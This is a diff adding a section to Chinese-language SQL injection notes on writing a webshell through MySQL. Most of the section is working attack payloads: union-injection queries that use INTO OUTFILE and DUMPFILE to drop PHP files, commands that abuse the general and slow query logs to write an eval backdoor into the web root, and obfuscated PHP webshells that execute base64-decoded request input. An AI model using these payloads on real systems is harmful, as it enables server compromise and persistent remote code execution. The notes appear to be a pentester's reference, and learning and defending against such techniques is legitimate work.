@@ -191,6 +191,66 @@ insert into table_name(name,text) values('\','(select something...))#');
 - ord() 函数返回字符串第一个字符的 ASCII 值
 - exp(e) 是以e为底的指数函数
 
+
+## MySql写shell 
+
+### outfile和dumpfile
+
+into outfile 可以导出多行数据,但是会在换行符后追加反斜杠,还会在最后添加换行符.所以不适合导出二进制文件
+into dumpfile 只能导出一行数据可以使用limit限制查询数据,不会追加反斜杠和换行符
+
+利用条件:
+- 数据库当前用户是root
+- 单引号没有被过滤
+- web服务的绝对路径
+- 绝对路径写入权限
+
+union查询注入点:
+
+```sql
+?id=1 UNION ALL SELECT 1,'<?php phpinfo();?>',3 into outfile 'C:\phpinfo.php'%23
+?id=1 UNION ALL SELECT 1,'<?php phpinfo();?>',3 into dumpfile 'C:\phpinfo.php'%23
+```
+
+其他情况
+
+```sql
+?id=1 into outfile 'C:\info.php' FIELDS TERMINATED BY '<?php phpinfo();?>'%23
+```
+
+`secure-file-friv`用于限制`info outfile`和`into dumpfile`的输出目录
+
+当`secure-file-friv`的值为null时,表示mysql不允许导出文件,mysql `5.6.34`版本后默认值为null,且不支持sql语句动态修改
+
+### 通过日志写shell
+
+```sql
+show variables like '%general%';
+set global general_log = on;
+set global general_log_file = '/var/www/html/1.php';
+select '<?php phpinfo();?>';
+select '<?php @eval($_POST[1]);?>';
+
+```
+
+php变形shell:
+
+```php
+<?php $sl = create_function('', @$_REQUEST['1']);$sl();?>
+<?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['1']));?>
+
+```
+
+慢查询日志,默认超过10秒的查询语句会被记录到慢查询日志:
+
+```sql
+how variables like '%slow_query_log%';
+set global slow_query_log=1;
+set global slow_query_log_file='C:\\phpStudy\\WWW\\1.php';
+select '<?php @eval($_POST[1]);?>' or sleep(11);
+```
+
+
 ## SQLMAP的使用
 
 ### options
